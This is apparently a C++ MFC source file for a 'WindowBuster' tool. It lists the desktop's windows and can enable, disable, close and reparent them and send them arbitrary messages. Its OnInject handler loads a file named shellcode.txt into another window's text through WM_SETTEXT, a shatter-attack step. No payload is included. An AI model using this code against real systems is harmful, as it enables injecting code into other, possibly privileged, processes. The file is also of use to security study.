// windowDlg.cpp : implementation file
//

#include "stdafx.h"
#include "window.h"
#include "windowDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()



//*************************************
//********** CallBack function ********
//*************************************

BOOL CALLBACK EnumChildProc(HWND hwnd,LPARAM lParam)
{
	char wtext[255]="",cltext[255];
	CString Text;
	CTreeCtrl	*m_windowtreectrl;
	HTREEITEM hItem = NULL;
	m_windowtreectrl=&(((CWindowDlg*) AfxGetMainWnd())->m_windowtreectrl);

	GetWindowText(hwnd,wtext,255);
	
	if(::IsWindowVisible(hwnd) > 0)
	{
		GetClassName(hwnd,cltext,255);

		Text.Format("0x%0 4.4X %s (%s)",(DWORD)hwnd,wtext,cltext);
		hItem=m_windowtreectrl->InsertItem(Text,0,0,(HTREEITEM)lParam);

		EnumChildWindows(hwnd,EnumChildProc,(LPARAM)hItem);

		
		//EnableWindow(hwnd,TRUE);
 
	}
	
	return TRUE;
}


BOOL CALLBACK EnumWindowProc(HWND hwnd, LPARAM lParam)
{
	char wtext[255],cltext[255];
	CString Text;
	CTreeCtrl	*m_windowtreectrl;
	HTREEITEM hItem = NULL;
	m_windowtreectrl=&(((CWindowDlg*) AfxGetMainWnd())->m_windowtreectrl);

	GetWindowText(hwnd,wtext,255);
	Text.ReleaseBuffer();

	if(::IsWindowVisible(hwnd) > 0)
	{
		GetClassName(hwnd,cltext,255);

		Text.Format("0x%0 4.4X %s (%s)",(DWORD)hwnd,wtext,cltext);
		hItem=m_windowtreectrl->InsertItem(Text,0,0,NULL);
		EnumChildWindows(hwnd,EnumChildProc,(LPARAM)hItem);
	}
	
	return TRUE;
}



/////////////////////////////////////////////////////////////////////////////
// CWindowDlg dialog

CWindowDlg::CWindowDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CWindowDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CWindowDlg)
	m_ButtonText = _T("");
	m_Parent = _T("");
	m_Number = _T("");
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CWindowDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CWindowDlg)
	DDX_Control(pDX, IDC_WindowTree, m_windowtreectrl);
	DDX_Text(pDX, IDC_TEXT, m_ButtonText);
	DDV_MaxChars(pDX, m_ButtonText, 255);
	DDX_Text(pDX, IDC_PARENT, m_Parent);
	DDX_Text(pDX, IDC_NUMBER, m_Number);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CWindowDlg, CDialog)
	//{{AFX_MSG_MAP(CWindowDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON1, OnListWindows)
	ON_BN_CLICKED(IDC_BUTTON2, OnEnable)
	ON_BN_CLICKED(IDC_BUTTON3, OnDisable)
	ON_BN_CLICKED(IDC_BUTTON4, OnDestroy)
	ON_NOTIFY(TVN_SELCHANGED, IDC_WindowTree, OnSelchangedWindowTree)
	ON_EN_CHANGE(IDC_TEXT, OnChangeText)
	ON_BN_CLICKED(IDC_BUTTON5, OnMinimize)
	ON_BN_CLICKED(IDC_BUTTON6, OnSetParent)
	ON_BN_CLICKED(IDC_BUTTON7, OnSetTextLimit)
	ON_BN_CLICKED(IDC_BUTTON8, OnGetText)
	ON_BN_CLICKED(IDC_BUTTON9, OnWMTimer)
	ON_BN_CLICKED(IDC_BUTTON11, OnInject)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CWindowDlg message handlers

BOOL CWindowDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	
	EnumWindows(EnumWindowProc, 0);

	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CWindowDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CWindowDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CWindowDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}
void CWindowDlg::OnListWindows() 

{
	m_windowtreectrl.DeleteAllItems();
	EnumWindows(EnumWindowProc, 0);
}



void CWindowDlg::OnEnable() 
{
	CString Text;
	HTREEITEM Item;
	HWND hwnd=0;

	Item=m_windowtreectrl.GetSelectedItem();
	Text=m_windowtreectrl.GetItemText(Item);
	
	StrToIntEx(Text,STIF_SUPPORT_HEX,((int *)&hwnd));

	::EnableWindow(hwnd,TRUE);
}

void CWindowDlg::OnDisable() 
{
	CString Text;
	HTREEITEM Item;
	HWND hwnd=0;

	Item=m_windowtreectrl.GetSelectedItem();
	Text=m_windowtreectrl.GetItemText(Item);
	
	StrToIntEx(Text,STIF_SUPPORT_HEX,((int *)&hwnd));

	::EnableWindow(hwnd,FALSE);
}

void CWindowDlg::OnDestroy() 
{
	CString Text;
	HTREEITEM Item;
	HWND hwnd=0;

	Item=m_windowtreectrl.GetSelectedItem();
	Text=m_windowtreectrl.GetItemText(Item);
	
	StrToIntEx(Text,STIF_SUPPORT_HEX,((int *)&hwnd));

	::SendMessage(hwnd,WM_CLOSE,NULL,NULL);
}



void CWindowDlg::OnSelchangedWindowTree(NMHDR* pNMHDR, LRESULT* pResult) 
{
	NM_TREEVIEW* pNMTreeView = (NM_TREEVIEW*)pNMHDR;
	// TODO: Add your control notification handler code here

	char wtext[255];
	CString Text;
	HTREEITEM Item;
	HWND hwnd=0;

	Item=m_windowtreectrl.GetSelectedItem();
	Text=m_windowtreectrl.GetItemText(Item);
	
	StrToIntEx(Text,STIF_SUPPORT_HEX,((int *)&hwnd));

	wtext[0]=0;

	::GetWindowText(hwnd,wtext,255);

	m_ButtonText=wtext;

	UpdateData(FALSE);





	*pResult = 0;
}


void CWindowDlg::OnChangeText() 
{
	CString Text;
	HTREEITEM Item;
	HWND hwnd=0;

	Item=m_windowtreectrl.GetSelectedItem();
	Text=m_windowtreectrl.GetItemText(Item);
	
	StrToIntEx(Text,STIF_SUPPORT_HEX,((int *)&hwnd));

	UpdateData(TRUE);

	::SendMessage(hwnd,WM_SETTEXT,0,(LPARAM)m_ButtonText.GetBuffer(255));
//	::SendMessage(hwnd,RDW_INTERNALPAINT,NULL,NULL);
}


void CWindowDlg::OnMinimize()
{
	CString Text;
	HTREEITEM Item;
	HWND hwnd=0;
	DWORD msg=0;

	Item=m_windowtreectrl.GetSelectedItem();
	Text=m_windowtreectrl.GetItemText(Item);
	
	StrToIntEx(Text,STIF_SUPPORT_HEX,((int *)&hwnd));


	UpdateData(TRUE);
	//MessageBox("test",m_Parent);
	StrToIntEx(m_Parent,STIF_SUPPORT_HEX,((int *)&msg));

//	::SendMessage(hwnd,msg,NULL,NULL);
	::ShowWindow(hwnd,msg);
}



void CWindowDlg::OnSetParent() 
{
	CString Text;
	HTREEITEM Item;
	HWND hwnd=0,hwndp=0;

	Item=m_windowtreectrl.GetSelectedItem();
	Text=m_windowtreectrl.GetItemText(Item);
	StrToIntEx(Text,STIF_SUPPORT_HEX,((int *)&hwnd));


	UpdateData(TRUE);
	//MessageBox("test",m_Parent);
	StrToIntEx(m_Parent,STIF_SUPPORT_HEX,((int *)&hwndp));

	if(hwnd!=hwndp)
		::SetParent(hwnd,hwndp);
	else
		MessageBox("WindowBuster","Can´t set window to it´s own parent-window");
 
}

void CWindowDlg::OnSetTextLimit() 
{
	CString Text;
	HTREEITEM Item;
	HWND hwnd=0;
	int cchMax=0;

	Item=m_windowtreectrl.GetSelectedItem();
	Text=m_windowtreectrl.GetItemText(Item);
	
	StrToIntEx(Text,STIF_SUPPORT_HEX,((int *)&hwnd));

	UpdateData(TRUE);
	StrToIntEx(m_Number,STIF_SUPPORT_HEX,((int *)&cchMax));

	::SendMessage(hwnd,EM_SETLIMITTEXT,cchMax,NULL);
}

void CWindowDlg::OnGetText() 
{
	CString Text;
	HTREEITEM Item;
	HWND hwnd=0;
	int cchTextMax=0;
	DWORD lpszText;

	Item=m_windowtreectrl.GetSelectedItem();
	Text=m_windowtreectrl.GetItemText(Item);
	
	StrToIntEx(Text,STIF_SUPPORT_HEX,((int *)&hwnd));

	UpdateData(TRUE);
	StrToIntEx(m_Number,STIF_SUPPORT_HEX,((int *)&cchTextMax));
	StrToIntEx(m_Parent,STIF_SUPPORT_HEX,((int *)&lpszText));

	//LRESULT test=::SendMessage(hwnd,WM_GETTEXT,cchTextMax,(LPARAM)lpszText);

	//::GetWindowText(hwnd,(char*)lpszText,cchTextMax);
}

void CWindowDlg::OnWMTimer() 
{
	CString Text;
	HTREEITEM Item;
	HWND hwnd=0;
	DWORD msg=0;

	Item=m_windowtreectrl.GetSelectedItem();
	Text=m_windowtreectrl.GetItemText(Item);
	
	StrToIntEx(Text,STIF_SUPPORT_HEX,((int *)&hwnd));


	UpdateData(TRUE);
	//MessageBox("test",m_Parent);
	StrToIntEx(m_Parent,STIF_SUPPORT_HEX,((int *)&msg));

	::SendMessage(hwnd,msg,NULL,NULL);
//	::ShowWindow(hwnd,msg);
}


void CWindowDlg::OnInject() 
{
	FILE *stream;
	char buffer[8192];
	CString Text;
	HTREEITEM Item;
	HWND hwnd=0;
	int codelength=0;

	memset(&buffer,0,8192);

	Item=m_windowtreectrl.GetSelectedItem();
	Text=m_windowtreectrl.GetItemText(Item);
	
	StrToIntEx(Text,STIF_SUPPORT_HEX,((int *)&hwnd));

	if((stream=fopen("shellcode.txt","rb"))==NULL)
		printf( "The file 'data' was not opened\n" );
	else
	{
		MessageBox( "The file 'data' was opened\n" );
		if(fread(&buffer,1,8191,stream))
		{
			MessageBox(buffer,"test",0);
		}
		if( fclose( stream ) )
		MessageBox( "The file 'data' was not closed\n" );
	}


	::SendMessage(hwnd,WM_SETTEXT,0,(LPARAM)&buffer);
}
